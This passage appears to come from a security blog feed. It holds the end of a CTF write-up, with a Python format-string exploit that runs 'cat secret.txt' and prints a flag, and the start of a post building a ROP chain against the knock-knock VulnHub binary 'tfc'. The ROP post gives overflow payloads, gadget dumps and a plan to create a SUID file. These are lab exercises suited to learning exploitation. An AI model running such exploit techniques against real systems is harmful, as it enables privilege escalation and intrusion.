</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># invoke Delete Mine, which triggers system() which our commands</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;n</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;n</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>After running this exploit, it returns the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>3^JDo you want to delete?
</span><span class='line'>Location: %34272c%11<span class="nv">$hn</span>
</span><span class='line'>Type: AA..CCCC
</span><span class='line'>y/n
</span><span class='line'>
</span><span class='line'>n^JDo you want to delete?
</span><span class='line'>Location: %2052c%11<span class="nv">$hn</span>
</span><span class='line'>Type: AA..CCCC
</span><span class='line'>y/n
</span><span class='line'>
</span><span class='line'>n^JDo you want to delete?
</span><span class='line'>Location: cat secret.txt 2<span class="p">&amp;</span>&gt;1
</span><span class='line'>Type: bleh
</span><span class='line'>y/n
</span><span class='line'>
</span><span class='line'>y^JFLAG<span class="o">{</span>d1aM0nd&gt;G0lD<span class="o">}</span>
</span><span class='line'>1<span class="o">)</span> Add mine
</span><span class='line'>2<span class="o">)</span> Show mines
</span><span class='line'>3<span class="o">)</span> Delete mine
</span><span class='line'>4<span class="o">)</span> Show profit
</span><span class='line'>5<span class="o">)</span> Exit
</span><span class='line'>id^J
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>flag{d1aM0nd&gt;G0lD}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Rop-rop for Knock-knock]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock/"/>
    <updated>2014-10-16T19:37:39+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock</id>
    <content type="html"><![CDATA[<p>I couldn&rsquo;t resist to make a ROP exploit for <code>tfc</code>, the last binary to root <a href="http://vulnhub.com/entry/knock-knock-11,105/">knock-knock</a>.</p>

<!--more-->


<p>I really like return-oriented-programming and I love to practice it! After seeing the awesome writeups for knock-knock by <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">leonjza</a>, <a href="https://blog.techorganic.com/2014/10/15/knock-knock-hacking-challenge/">superkojiman</a> and <a href="https://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/">knapsy</a>, I was itching to see if I could pull a ROP exploit off. I knew about the buffer overflow, but what would I need to re-use code present in the binary? There are many &lsquo;types&rsquo; of ROP, such as <code>ret2libc</code> and chaining of so-called ROP gadgets. I first checked if there were enough gadgets to pull something off, like spawning a shell. <code>radare2</code> now has a nice feature where you can search for ROP gadgets with <code>/R</code>. Furthermore, <code>gdb-peda</code> has an awesome ROP gadget search function. Lastly, I <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">built a custom ROP gadget dumper</a>. Not the most elegant solution, but it gives me a file I can <code>cat</code> and <code>grep</code>. Unfortunately, the amount of gadgets was only 107 and they weren&rsquo;t really useful, either. Back to the drawing board!</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># sample output of ropgadgets.py</span>
RET: 0x8048921: add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
RET: 0x804891f: add <span class="o">[</span>eax<span class="o">]</span>, al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
CALL_REG: 0x8048917: and al, 0xe8<span class="p">;</span> call ebx<span class="p">;</span> 
CALL_REG: 0x8048911: dec dword <span class="o">[</span>ebx+0x489f045<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> call ebx<span class="p">;</span> 
JMP_REG: 0x8048753: and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
JMP_REG: 0x804874d: fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
JMP_REG: 0x804874b: and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
JMP_REG: 0x804874a: inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
JMP_REG: 0x8048748: add edi, eax<span class="p">;</span> inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
JMP_REG: 0x8048747: rol byte <span class="o">[</span>ecx<span class="o">]</span>, 0xc7<span class="p">;</span> inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
RET: 0x80486e3: add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
RET: 0x80486e1: add <span class="o">[</span>eax<span class="o">]</span>, al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
RET: 0x8048615: dec ecx<span class="p">;</span> ret<span class="p">;</span></code></pre></div>


<p>There are more ways to go about this problem. We want to do something that will lead to a root shell, without actually executing shellcode on the stack. But without enough gadgets, we&rsquo;re left with not much else. But wait! We still have access to the functions that the binary uses.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>objdump -d tfc <span class="p">|</span>grep <span class="s2">&quot;.plt&quot;</span> 
Disassembly of section .plt:

<span class="m">08048430</span> &lt;strcmp@plt-0x10&gt;:
 8048430:   ff <span class="m">35</span> 4c 9d <span class="m">04</span> <span class="m">08</span>      pushl  0x8049d4c
 8048436:   ff <span class="m">25</span> <span class="m">50</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d50
 804843c:   <span class="m">00</span> <span class="m">00</span>                 add    %al,<span class="o">(</span>%eax<span class="o">)</span>
    ...

<span class="m">08048440</span> &lt;strcmp@plt&gt;:
 8048440:   ff <span class="m">25</span> <span class="m">54</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d54
 8048446:   <span class="m">68</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x0</span>
 804844b:   e9 e0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

<span class="m">08048450</span> &lt;<span class="nb">read</span>@plt&gt;:
 8048450:   ff <span class="m">25</span> <span class="m">58</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d58
 8048456:   <span class="m">68</span> <span class="m">08</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x8</span>
 804845b:   e9 d0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

<span class="m">08048460</span> &lt;<span class="nb">printf</span>@plt&gt;:
 8048460:   ff <span class="m">25</span> 5c 9d <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049d5c
 8048466:   <span class="m">68</span> <span class="m">10</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x10</span>
 804846b:   e9 c0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

<span class="m">08048470</span> &lt;__xstat@plt&gt;:
 8048470:   ff <span class="m">25</span> <span class="m">60</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d60
 8048476:   <span class="m">68</span> <span class="m">18</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x18</span>
 804847b:   e9 b0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

<span class="m">08048480</span> &lt;puts@plt&gt;:
 8048480:   ff <span class="m">25</span> <span class="m">64</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d64
 8048486:   <span class="m">68</span> <span class="m">20</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x20</span>
 804848b:   e9 a0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

<span class="m">08048490</span> &lt;__gmon_start__@plt&gt;:
 8048490:   ff <span class="m">25</span> <span class="m">68</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d68
 8048496:   <span class="m">68</span> <span class="m">28</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x28</span>
 804849b:   e9 <span class="m">90</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484a0 &lt;open@plt&gt;:
 80484a0:   ff <span class="m">25</span> 6c 9d <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049d6c
 80484a6:   <span class="m">68</span> <span class="m">30</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x30</span>
 80484ab:   e9 <span class="m">80</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484b0 &lt;__libc_start_main@plt&gt;:
 80484b0:   ff <span class="m">25</span> <span class="m">70</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d70
 80484b6:   <span class="m">68</span> <span class="m">38</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x38</span>
 80484bb:   e9 <span class="m">70</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484c0 &lt;write@plt&gt;:
 80484c0:   ff <span class="m">25</span> <span class="m">74</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d74
 80484c6:   <span class="m">68</span> <span class="m">40</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x40</span>
 80484cb:   e9 <span class="m">60</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484d0 &lt;strrchr@plt&gt;:
 80484d0:   ff <span class="m">25</span> <span class="m">78</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d78
 80484d6:   <span class="m">68</span> <span class="m">48</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x48</span>
 80484db:   e9 <span class="m">50</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484e0 &lt;__lxstat@plt&gt;:
 80484e0:   ff <span class="m">25</span> 7c 9d <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049d7c
 80484e6:   <span class="m">68</span> <span class="m">50</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x50</span>
 80484eb:   e9 <span class="m">40</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484f0 &lt;close@plt&gt;:
 80484f0:   ff <span class="m">25</span> <span class="m">80</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d80
 80484f6:   <span class="m">68</span> <span class="m">58</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x58</span>
 80484fb:   e9 <span class="m">30</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;</code></pre></div>


<p>We can re-use <code>open</code>, <code>read</code> and <code>write</code> to basically read and write any file we want! I began to write a basic Proof of Concept ROP chain. This chain would simply write to a file descriptor that is already open. These file descriptors are incremented every time a file is opened and therefore guessable. This will help later on, when we open our own files. Without gadgets, it is hard to pass values from one function call to the next&hellip; Luckily, 0x0 through 0x2 are used for stdin, stdout and stderr, and any file that is opened after that gets 0x3. The next one gets 0x4, and so on. This means that <code>in.tfc</code> is 0x3 and <code>out.tfc</code> is 0x4.</p>

<p>I searched for the address of <code>write@plt</code> which turned out to be <code>0x80484c0</code>. I leveraged my buffer overflow from before to take control of code execution. We supply a large input of at least 4124 bytes. The buffer overflows, the return address on the stack is overwritten with the address of <code>write</code>. When the <code>ret</code> statement executes, we take control of code execution. Because the address points to <code>write</code>, this function will be executed using values conveniently placed on the stack. So at the point of gaining control of <code>eip</code>:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="n">AAAA</span>
<span class="n">esp</span><span class="o">--&gt;:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="n">FAKE</span>        <span class="err">#</span> <span class="n">fake</span> <span class="k">return</span> <span class="n">address</span> <span class="k">for</span> <span class="n">when</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span> <span class="n">complets</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="err">&#39;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="o">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span></code></pre></div>


<p>I ran this through the encryption Python script and fed the output to <code>tfc</code>:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;print &quot;A&quot;*4124 + &quot;\xc0\x84\x04\x08AAAA\x04\x00\x00\x00\xb0\x88\x04\x08\x03\x00\x00\x00&quot;&#39;</span> &gt; in.tfc <span class="o">&amp;&amp;</span> python ./enc.py
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc test5.tfc
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>xxd test5.tfc
0000000: 8b45 ec</code></pre></div>


<p>Success! The three bytes from the buffer are written into <code>test5.tfc</code>. This isn&rsquo;t very useful yet, so I decided to create my own file first. This way, we can specify permissions, such as having the SUID bit set! The plan, in very ugly pseudo-code, is:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">file1</span> <span class="o">=</span> open<span class="o">(</span><span class="s1">&#39;file1&#39;</span>, <span class="s1">&#39;w&#39;</span>, 04777<span class="o">)</span>
<span class="nv">file2</span> <span class="o">=</span> open<span class="o">(</span><span class="s1">&#39;file2&#39;</span>, <span class="s1">&#39;r&#39;</span><span class="o">)</span>
<span class="nb">read</span><span class="o">(</span>file2, <span class="p">&amp;</span>buf, sizeof<span class="o">(</span>file2<span class="o">))</span>
write<span class="o">(</span>file1, <span class="p">&amp;</span>buf, sizeof<span class="o">(</span>file1<span class="o">))</span></code></pre></div>


<p>I&rsquo;ll go step by step. First, let&rsquo;s open our own file. The functions <a href="http://linux.die.net/man/2/open">open</a> and <a href="http://linux.die.net/man/2/write">write</a> look like this:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">mode_t</span> <span class="n">mode</span><span class="p">);</span>
<span class="kt">ssize_t</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span></code></pre></div>


<p>There are several challenges here. First, we cannot specify our own filename, because we cannot pass strings to the program and know where they&rsquo;ll end up on the stack. Second, we can&rsquo;t pass the filehandle around. Third, I have no clue how <code>flags</code> and <code>mode</code> work, in binary. Fourth, we need some way to clean up the stack so we can chain these libc calls together.</p>

<p>Overcoming the first challenge is easy. <code>tfc</code> contains several strings which we can re-use. I chose &lsquo;read&rsquo; as I though it was fitting. It&rsquo;s located at <code>0x8049315</code>. For the output file, I already looked up the location of &lsquo;write&rsquo; at <code>0x804933e</code>. I then proceeded to make a small binary, to get the values for <code>flags</code> and <code>mode</code>:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;sys/types.h&gt;</span>
<span class="cp">#include &lt;sys/stat.h&gt;</span>
<span class="cp">#include &lt;fcntl.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> 
<span class="p">{</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&quot;test&quot;</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_APPEND</span><span class="o">|</span><span class="n">O_CREAT</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span></code></pre></div>




<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>objdump -d a.out <span class="p">|</span>grep open -B4
--
  400579:   ba ed <span class="m">09</span> <span class="m">00</span> <span class="m">00</span>         mov    <span class="nv">$0x9ed</span>,%edx
  40057e:   be <span class="m">41</span> <span class="m">04</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x441</span>,%esi
  400583:   bf <span class="m">34</span> <span class="m">06</span> <span class="m">40</span> <span class="m">00</span>          mov    <span class="nv">$0x400634</span>,%edi
  400588:   b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x0</span>,%eax
  40058d:   e8 ce fe ff ff          callq  <span class="m">400460</span> &lt;open@plt&gt;</code></pre></div>


<p>Finally, cleaning up the stack is necessary. After the first call to open, the stack would look like this:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">--&gt;:</span> <span class="n">next_func</span>   <span class="err">#</span> <span class="n">next</span> <span class="n">function</span> <span class="n">address</span>
<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="err">&#39;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span>

<span class="k">return</span> <span class="n">to</span> <span class="nl">next_func</span><span class="p">:</span>

<span class="n">esp</span><span class="o">-</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="n">next_func</span>   <span class="err">#</span> <span class="n">next</span> <span class="n">function</span> <span class="n">address</span>
<span class="n">esp</span><span class="o">--&gt;:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="err">&#39;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span></code></pre></div>


<p>But next_func requires completely different arguments! We need to align the stack pointer after returning from &lsquo;write&rsquo;. This can be removing a few values from the stack before return to next_func.</p>

<p>This removal of values can be using a primitive called <code>pop pop pop ret</code>. The return address for the libc calls is a place in the binary that contains three pop instructions, which pop three values from the stack, and then return to whatever value is on the stack. This allows code execution to continue smoothly, otherwise it might choke on one of the values that we pass to a libc function. I used my ropgadget script to find it at <code>0x80489d6</code>; there are many more, and many other ways to find them. The basic ROP chain element now looks like this:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">--&gt;:</span> <span class="n">ADDR</span>        <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>

<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="n">PPPR</span>        <span class="err">#</span> <span class="n">pop</span> <span class="n">pop</span> <span class="n">pop</span> <span class="n">ret</span> <span class="n">primitive</span><span class="p">,</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">values</span> <span class="n">from</span> <span class="n">the</span> <span class="n">stack</span><span class="p">.</span> 
                    <span class="err">#</span> <span class="n">this</span> <span class="n">pppr</span> <span class="n">primitive</span> <span class="n">must</span> <span class="n">have</span> <span class="n">enough</span> <span class="n">POPs</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">N</span> <span class="n">arguments</span> <span class="n">from</span> <span class="n">the</span> <span class="n">stack</span><span class="o">!</span>

<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="n">ARG_1</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">one</span> <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="n">ARG_2</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">two</span> <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="o">:</span> <span class="n">ARG_n</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">n</span>   <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>

<span class="n">esp</span><span class="o">+</span><span class="mi">14</span><span class="o">:</span> <span class="n">NEXT</span>        <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="n">next</span> <span class="n">function</span> <span class="n">at</span> <span class="n">NEXT</span></code></pre></div>


<p>So we have all the values we need, let&rsquo;s put it together in a semi-smart and flexible way. I made a python script to handle building and encrypting the payload:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
    
<span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span> 
    
    <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
        
        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
            <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
                <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
    
    <span class="k">return</span> <span class="n">output</span>
    
<span class="k">def</span> <span class="nf">genPayload</span><span class="p">():</span>
